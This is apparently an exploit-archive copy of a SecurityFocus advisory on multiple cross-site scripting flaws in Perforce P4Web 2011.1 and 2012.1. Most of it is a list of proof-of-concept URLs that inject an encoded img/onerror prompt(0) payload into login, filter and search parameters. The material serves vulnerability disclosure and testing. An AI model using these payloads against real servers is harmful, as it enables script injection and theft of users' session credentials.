@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/57514/info
+
+Perforce P4Web is prone to multiple cross site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Perforce P4Web versions 2011.1 and 2012.1 are vulnerable; other versions may also be affected.
+
+http://www.example.com/u=Administrator&p=&c=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Submit=Log+In&orgurl=
+
+http://www.example.com/cnm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Updated=after&cdu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&cow=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Accessed=after&cda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&cho=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Show=Filter
+
+http://www.example.com/@md=c&cd=//&cl=%22%3E%3Cimg%20src=x%20onerror=prompt%280%29;%3E&c=5q7@//?ac=81
+
+http://www.example.com/unm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Updated=after&udu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Accessed=after&uda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Show=Filter
+
+http://www.example.com/filter=147&fileFilter=matching&pattern=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&showClient=showClient&Filter=Filter
+
+http://www.example.com/goField=%2F%2F%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Go=Go
+
+http://www.example.com/bnm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Updated=after&bdu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&bow=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Accessed=after&bda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Show=Filter
+
+http://www.example.com/lnm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Updated=after&ldu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&low=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Accessed=after&lda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Show=Filter
+
+http://www.example.com/Filter=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Asc=hi&Max=25&Show=Filter
+
+http://www.example.com/Filter=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Asc=hi&Max=10&Jsf=Job&Jsf=Status&Jsf=User&Jsf=Date&Jsf=Description&Show=Filter
+
+http://www.example.com/UpToVal=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&User=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Max=50&PatVal=...+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&Client=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&AllC=y&Show=Filter 
